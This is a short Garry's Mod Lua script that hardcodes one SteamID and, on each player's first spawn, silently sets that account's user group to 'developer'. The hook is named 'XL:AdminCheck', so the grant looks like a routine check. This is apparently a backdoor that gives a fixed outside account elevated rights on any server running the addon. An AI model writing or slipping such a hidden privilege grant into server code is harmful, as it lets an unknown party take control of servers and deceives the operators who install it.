local dev = {
	["STEAM_0:1:572284808"] = true,
}

hook.Add( "PlayerInitialSpawn", "XL:AdminCheck", function( ply )
	timer.Simple( 0, function()
		if dev[ply:SteamID()] then
			ply:SetUserGroup("developer")
		end
	end)
end)